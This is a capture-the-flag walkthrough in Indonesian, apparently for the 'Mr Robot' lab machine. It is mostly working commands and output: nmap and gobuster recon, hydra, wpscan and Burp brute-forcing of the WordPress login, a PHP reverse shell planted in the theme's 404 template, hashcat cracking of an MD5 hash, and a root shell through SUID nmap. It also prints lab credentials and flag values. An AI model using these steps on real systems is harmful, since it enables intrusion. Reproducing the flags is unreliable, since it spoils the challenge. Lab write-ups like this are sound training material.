Lakukan scanning pada IP address dengan nmap

```shell
nmap -sV -sC IP-target -oN zcan
```

hasil scan dengan nmap:

```shell
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).

```

coba cari `web`/robots.txt untuk mencari file yang tidak terindex, yang didapat dari robots.txt

```shell
User-agent: *
fsocity.dic
key-1-of-3.txt
```

kita mendapat key1, kita dapat menambahkannya ke URI `IP/key-1-of-3.txt`, dan hasilnya

```shell
073403c8a58a1f80d943455fb30724b9
```

kita dapat download `fsocity.dic` file dengan

```shell
wget http://IP/fsocity.dic
```

isi dari dic tersebut adalah list yang cukup panjang, dan mencurigakan.

selanjutnya kita scan dir dengan gobuster

```shell
gobuster dir -u http://10.10.77.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobbed
```

berikut adalah beberapa direktori yang berhasil ditemukan

```shell
/images               (Status: 301) [Size: 235] [--> http://10.10.77.103/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.77.103/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.77.103/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.77.103/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.77.103/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.77.103/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.77.103/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.77.103/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.77.103/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.77.103/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.77.103/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.77.103/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2664]
/css                  (Status: 301) [Size: 232] [--> http://10.10.77.103/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.77.103/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.77.103/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.77.103/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.77.103/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.77.103/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.77.103/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.77.103/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.77.103/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.77.103/wp-admin/]
/phpmyadmin           (Status: 403) [Size: 94]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.77.103/0000/]
/xmlrpc               (Status: 405) [Size: 42]
```

salah satu dari dir yang ditemukan dan cukup menarik adalah `/wp-login` karena memiliki status code 200, tidak seperti `/wp-admin` yang memiliki status code 300 atau redirect. Kita dapat mengunjungi `IP/wp-login`, dan kita akan mendapat halaman login wordpress.

Jika kita mencoba login dengan `admin:admin` maka akan ada peringatan `ERROR: Invalid username. Lost your password?`, yang mana ini cukup berbahaya dan menguntungkan untuk adversary. Dari file `fsocity.dic`, dapat kita asumsikan bahwa itu merupakan wordlist. kita dapat menggunakan `fsocity.dic` untuk brute force login ke `wp-login`.

untuk hal ini kita akan menggunakan burpsuite. Buka burpsuite dan `intercept on`, atur foxy proxy di firefox. Selanjutnya coba login dengan `admin:admin`, maka nanti akan otomatis terlempar ke burpsuite di tab Proxy/Intercept. Klik kanan, lalu pilih `send to Intruder`. Pada tab Intruder/Payloads, load Payloads setting dengan file `fsocity.dic`, lalu pada bagian position, tambahkan simbol `§` pada bagian log seperti berikut dengan tombol `Add §`. Jika sudah, kita dapat start attack.

```shell
log=§§&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.77.103%2Fwp-admin%2F&testcookie=1
```

atau kita bisa juga menggunakan hydra untuk bruteforce

```shell
hydra -V -L fsocity.dic  -p admin 10.10.77.103 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
```

hasilnya, terlihat bahwa username dengan `Elliot` memiliki Length 4148 (burpsuite), jika kita lihat pada bagian Response/Render, terlihat bahwa pesan Error telah berubah dari `invalid username` ke `invalid password`. Jadi dapat kita simpulkan bahwa username yang dapat kita gunakan adalah `Elliot`. Selanjutnya kita akan coba untuk bruteforce login dengan hydra atau WPScan untuk bagian password.

pertama, kita perlu reduce size dengan cara 

```shell
sort fsocity.dic | uniq > fsocity_sorted.dic
```

untuk brute force menggunakan hydra lakukan

```shell
hydra -V -l Elliot -P fsocity_sorted.dic 10.10.77.103 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered'
```

hasilnya

```shell
...
[ATTEMPT] target 10.10.77.103 - login "Elliot" - pass "event" - 5659 of 11452 [child 4] (0/0)
[80][http-post-form] host: 10.10.77.103   login: Elliot   password: ER28-0652
...
```

untuk brute force menggunakan WPScan lakukan

```shell
wpscan --url http://10.10.77.103/wp-login.php --usernames Elliot -P fsocity_sorted.dic
```

hasilnya

```shell
...
[!] Valid Combinations Found:
	Username: Elliot, Password: ER28-0652
...
```

selanjutnya kita dapat login dengan creds `Elliot:ER28-0652` di login page. Setelah berhasil masuk, kita dapat cek siapa saja User yang ada di WPScan dengan pergi ke tab `User > All User`. Kita temukan bahwa ada 2 akun(dalam kasusku), yaitu Elliot sebagai Administrator, dan Krista Gordon sebagai Subscriber. Kita bisa melakukan brute-force password pada user tersebut dengan hydra (optional), dan hasilnya

```shell
[80][http-post-form] host: 10.10.152.97   login: mich05654   password: Dylan_2791
```

selanjutnya kita dapat menanam reverse shell ke wordpress dengan cara mengedit tema. Pergi ke tab `Appearance > Editor` lalu pilih `404 Template` pada bagian kanan. Selanjutnya kita dapat copas isi dari [revshell pentest monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) ke dalam kolom edit `404 Template` dan tidak lupa untuk edit pada bagian ip dan port

```php
...
$ip = 'LOCAL-IP';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
...
```

lalu pilih `Update File`. Jika sudah, kita dapat setup netcat listener dengan `nc -lvnp 4444`, lalu kita pergi ke `http://IP-TARGET/404.php`, maka kita akan mendapat shell.

Kita dapat cek, sebagai siapa kita login dengan `whoami`, dan hasilnya adalah `daemon`. Kita dapat pergi ke `/home` untuk mengetahui siapa saja user yang ada, dan hasilnya adalah `robot`. Didalam homdir `robot`, terdapat 2 file ketika kita cek dengan `ls -la`

```shell
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

ternyata terdapat key2, namun kita tidak bisa melihatnya karena file permission hanya bisa dilihat oleh owner. Tapi file `password.raw-md5` ketika di `cat`, akan memunculkan creds `robot:c3fcd3d76192e4007dfb496cca67e13b`. Karena sudah terpampang nyata bahwa itu adalh md5, kita dapat crack dengan hashcat di local

```shell
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash

hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

dan hasilnya adalah:

```shell
...
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
...
```

setelah dapat passwordnya, kita dapat login sebagai `robot` dengan cara 

```shell
su robot

Password: abcdefghijklmnopqrstuvwxyz
```

dan kita dapat cat key2 dengan `cat key-2-of-3.txt`

```shell
822c73956184f694993bede3eb39f959
```

selanjutnya untuk key3 pastinya berada di root. Hint yang ada di room adalah `nmap`, dapat kita asumsikan bahwa kita dapat memanfaatkan SUID. Kita dapat cek apakah nmap masuk ke SUID atau tidak dengan cara

```shell
find / -perm -u=s -type f 2>/dev/null
```

dan ternyata ada. Maka kita bisa pergi ke [GTFOBin](https://gtfobins.github.io/gtfobins/nmap/) untuk mencari exploit SUID `nmap`. Dibagian Shell terdapat 2 pilihan, dan pilihan (b) terlihat lebih cepat, kita dapat cek versi nmap dengan `nmap --version`, dan kita dapatkan nmap versi 3.x. maka kita dapat menerapkan option (b)

```shell
nmap --interactive

nmap> !sh
```

dan kita akan mendapat root shell. kita bisa pergi ke `/root` dir untuk mengambil flag ke 3 dengan `cat /root/key-3-of-3.txt`

```shell
04787ddef27c3dee1ee161b21670b4e4
```